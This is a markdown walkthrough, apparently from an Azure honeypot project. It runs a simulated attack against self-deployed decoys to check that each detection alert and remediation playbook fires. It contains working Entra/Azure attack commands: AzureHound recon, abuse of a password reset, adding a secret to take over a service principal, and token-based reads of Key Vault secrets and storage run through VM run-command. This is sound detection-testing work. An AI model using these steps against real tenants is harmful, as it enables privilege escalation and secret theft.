# Attacker walkthrough: trip every honeypot alert

A post-compromise walk from the foothold **`attacker-test`** (no other privilege). Each action
lists the **alert** it fires and the **playbook** that runs. Steps are ordered so each one's
prerequisite comes from an earlier step: reset the emergency-access decoy, take over the reachable
service principal, then use the SP's RBAC to loot the decoy resources.

The playbooks are **enforcing** (not dry-run): disable-user actually disables a decoy identity, and
isolate-resource actually locks the decoy resource group. Both are guarded so they only ever act on
the objects in `inventory/decoy-inventory.json`, and never on a Global Admin or break-glass account.

Prerequisite: deploy all six stages first (`foundation → identity → network → edge → detection →
response`, see `deploy/README.md`). `edge.sh` wires the SP's RBAC that Stage 4 below depends on.

## Setup (operator)
Read the live decoy IDs from the inventory instead of hardcoding them:
```bash
INV=inventory/decoy-inventory.json
TENANT=$(jq -r .tenantId "$INV")
APP_ID=$(jq -r .identity.reachableApp.appId "$INV")
EMG_UPN=$(jq -r .identity.emergencyAccess.upn "$INV")
AU_ID=$(jq -r .identity.emergencyAccess.administrativeUnitId "$INV")
RG=$(basename "$(jq -r .network.honeypotResourceGroupId "$INV")")
KV=$(basename "$(jq -r .network.keyVaultId "$INV")")
SA=$(basename "$(jq -r .network.storageAccountId "$INV")")
VM=$(basename "$(jq -r .network.decoyVmId "$INV")")
```
Alerts land in **Defender → Incidents** (filter `Honeypot`) and in Sentinel. Rules run every 5 min
plus ingest lag. The playbooks are enforcing, so a decoy is disabled ~10 min after its first alert:
run the actions within a stage back-to-back, then verify alerts at the end (Stage 6).

---

## Stage 1: Connect as the foothold
Use a separate CLI profile so `attacker-test` holds only its own token:
```bash
export AZURE_CONFIG_DIR=~/.az-attacker
az login --allow-no-subscriptions          # attacker-test@… (+ MFA if prompted)
az ad signed-in-user show --query userPrincipalName -o tsv
```
The foothold is tenant-only (no subscription), so any ARM call errors with `SubscriptionNotFound`,
which confirms it has no subscription rights. Its one directory role is **Privileged Authentication
Administrator**, scoped to the emergency AU (`/administrativeUnits/…`, not `/`):
```bash
ME=$(az ad signed-in-user show --query id -o tsv)
az rest --method get \
  --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?\$filter=principalId eq '$ME'&\$expand=roleDefinition" \
  --query "value[].{role:roleDefinition.displayName, scope:directoryScopeId}" -o table
```
No alert (access only).

---

## Stage 2: Recon (AzureHound / BloodHound)
AzureHound's `-u/-p` (ROPC) cannot satisfy MFA (`AADSTS50076`). Reuse the interactive session from
Stage 1 with a Graph token instead:
```bash
go install github.com/bloodhoundad/azurehound/v2@latest        # once
JWT=$(az account get-access-token --resource-type ms-graph --query accessToken -o tsv)
azurehound -j "$JWT" list --tenant "$TENANT" -o azurehound.json
```

### BloodHound CE web interface
```bash
mkdir -p ~/bloodhound-ce && cd ~/bloodhound-ce
curl -L https://ghst.ly/getbhce -o docker-compose.yml
docker compose pull
docker compose up -d
docker compose logs bloodhound | grep -i "Initial Password"     # first start only
```
Open `http://localhost:8080` (loopback only), sign in as `admin` with that password, set a new one.
Import the collection: **Administration → File Ingest → Upload File(s)** → select `azurehound.json`.
Then run *"Shortest paths to Azure Tenant Admins"*.

You will see two hooks: your **Privileged Authentication Administrator** role (BloodHound ignores AU
scope and draws `AZResetPassword` edges to real Tenant Admins and break-glass), and that you **own**
`core-automation-runner` (its app requests `RoleManagement.ReadWrite.Directory`, never consented, and
carries pre-seeded credentials so it looks live).

**Containment proof:** the graph over-states. The role is really AU-scoped, so the only account you
can reset is the decoy:
```bash
az rest --method get \
  --url "https://graph.microsoft.com/v1.0/directory/administrativeUnits/$AU_ID/members?\$select=displayName,userPrincipalName" \
  --query "value[].{name:displayName, upn:userPrincipalName}" -o table
# => only the emergency-access decoy; every Tenant-Admin edge BloodHound drew is false.
```
No alert.

---

## Stage 3: Abuse the password-reset primitive
Reset the hollow admin you actually have reach over:
```bash
az ad user update --id "$EMG_UPN" \
  --password 'Pwn3d-2026!' --force-change-password-next-sign-in false
```
- **Alert:** *privileged authentication action by a non-allowlisted principal* (High)
- **Playbook:** disable-user disables the `emergency-access` decoy; leaves you (not a decoy) alone.

Sign in as the account you just reset:
```bash
AZURE_CONFIG_DIR=~/.az-emergency az login --allow-no-subscriptions   # Ctrl-C at MFA prompt; row logs
```
- **Alert:** *sign-in as emergency-access decoy* (High)
- **Playbook:** disable-user.

---

## Stage 4: Take over the reachable service principal
You own `core-automation-runner`, so add a secret and act as its SP:
```bash
az ad app credential reset --id "$APP_ID" --append --years 1        # prints appId / password / tenant
```
- **Alert:** *credential added to decoy service principal/app* (High)
- **Playbook:** disable-user disables the decoy SP.

Sign in as the SP (MFA-immune):
```bash
AZURE_CONFIG_DIR=~/.az-sp az login --service-principal \
  -u "$APP_ID" -p '<secret-from-above>' --tenant "$TENANT" --allow-no-subscriptions
```
- **Alert:** *sign-in as decoy service principal* (High)
- **Playbook:** disable-user.

Try to self-consent the god-mode permission the app requests (denied, you are not a Global Admin,
and a denied consent logs nothing, so no alert; the hook is that the request looks grantable):
```bash
AZURE_CONFIG_DIR=~/.az-sp az ad app permission admin-consent --id "$APP_ID"   # AuthorizationFailed
```
The consent rule is an **insider** tripwire, only a real admin actually granting the request fires
it. Demonstrate it with an admin profile:
```bash
# [admin] grant the decoy app's requested permission (fires the rule; revoke after)
AZURE_CONFIG_DIR=~/.az-admin az login
AZURE_CONFIG_DIR=~/.az-admin az ad app permission admin-consent --id "$APP_ID"
```
- **Alert:** *admin consent granted to decoy app/service principal (insider)* (High)
- **Playbook:** disable-user.

---

## Stage 5: Loot the decoy resources (as the SP, from inside the spoke)
Run these promptly after Stage 4: enforcing remediation disables the decoy SP within ~10 min of the
sign-in alert. If the SP is already disabled, re-enable it as admin to continue
(`az ad sp update --id "$APP_ID" --account-enabled true`).

The decoy KV and storage are **private-only** (no public data-plane endpoint) and the storage
account has **shared-key auth disabled**, so you loot them exactly as a real internal attacker would:
mint SP tokens from your foothold, then reach the resources' private endpoints from **inside the
spoke** by running `curl` on the decoy VM (which resolves the private IPs). The SP is Key Vault
Secrets User on the KV, Storage Blob Data Reader on the storage account, and Owner of the decoy RG
(so it can run commands on the VM). Because the KV/storage reads run via `az vm run-command`, each
also trips the VM run-command alert.

Read a KV honeytoken (mint a vault token as the SP, read it from the VM over the private endpoint):
```bash
KV_TOKEN=$(AZURE_CONFIG_DIR=~/.az-sp az account get-access-token \
  --resource https://vault.azure.net --query accessToken -o tsv)
AZURE_CONFIG_DIR=~/.az-sp az vm run-command invoke -g "$RG" -n "$VM" \
  --command-id RunShellScript --scripts \
  "curl -s -H 'Authorization: Bearer $KV_TOKEN' 'https://$KV.vault.azure.net/secrets/github-actions-pat?api-version=7.4'"
```
- **Alert:** *decoy Key Vault secret accessed* (High)
- **Playbook:** isolate-resource locks the decoy resource.

Raid the decoy storage (mint a storage token as the SP, list the container from the VM over the
blob private endpoint, Entra auth since shared-key is disabled):
```bash
SA_TOKEN=$(AZURE_CONFIG_DIR=~/.az-sp az account get-access-token \
  --resource https://storage.azure.com --query accessToken -o tsv)
AZURE_CONFIG_DIR=~/.az-sp az vm run-command invoke -g "$RG" -n "$VM" \
  --command-id RunShellScript --scripts \
  "curl -s -H 'Authorization: Bearer $SA_TOKEN' -H 'x-ms-version: 2021-08-06' 'https://$SA.blob.core.windows.net/backups?restype=container&comp=list'"
```
- **Alert:** *decoy storage accessed* (High)
- **Playbook:** isolate-resource.

Run a command on the decoy VM (RG Owner can, the VM has no legitimate use):
```bash
AZURE_CONFIG_DIR=~/.az-sp az vm run-command invoke -g "$RG" -n "$VM" \
  --command-id RunShellScript --scripts "id"
```
- **Alert:** *run-command on decoy VM* (High)
- **Playbook:** isolate-resource.

---

## Stage 6: Verify
```bash
# [admin] incidents, newest first
WS=$(az monitor log-analytics workspace show -g rg-core-ops-weu -n log-core-ops-weu --query customerId -o tsv)
az monitor log-analytics query -w "$WS" --analytics-query \
 'SecurityIncident | summarize arg_max(TimeGenerated,*) by IncidentNumber | where Title has "Honeypot" | project IncidentNumber, Severity, Status, Title | order by IncidentNumber desc' -o table
```
- **Portal:** Defender → Incidents (filter `Honeypot`).
- **Enforcement:** the disabled decoys (`az ad user show`/`az ad sp show` → `accountEnabled:false`)
  and the resource lock on the decoy RG (`az lock list -g "$RG"`).

Clean up attacker profiles:
```bash
rm -rf ~/.az-attacker ~/.az-sp ~/.az-emergency ~/.az-admin
```
To re-test rapidly, give each trigger its own incident, then restore the default grouping:
```bash
GROUPING_LOOKBACK=PT5M ./deploy/detection.sh
./deploy/detection.sh
```

---

## Action → Alert → Playbook (run order)
| Stage | Action | Alert (High) | Playbook |
|---|---|---|---|
| 3 | Reset `emergency-access` | privileged auth action by non-allowlisted principal | disable-user |
| 3 | Sign in as `emergency-access` | sign-in as emergency-access decoy | disable-user |
| 4 | Add secret to reachable app | credential added to decoy SP/app | disable-user |
| 4 | Sign in as the SP | sign-in as decoy service principal | disable-user |
| 4 | Self-consent the SP (denied) | none (denied consent logs nothing) | none |
| 4 | **[admin]** grant consent to the app | admin consent granted to decoy (insider) | disable-user |
| 5 | Read decoy KV secret | decoy Key Vault secret accessed | isolate-resource |
| 5 | Read decoy storage blob | decoy storage accessed | isolate-resource |
| 5 | Run-command on decoy VM | run-command on decoy VM | isolate-resource |
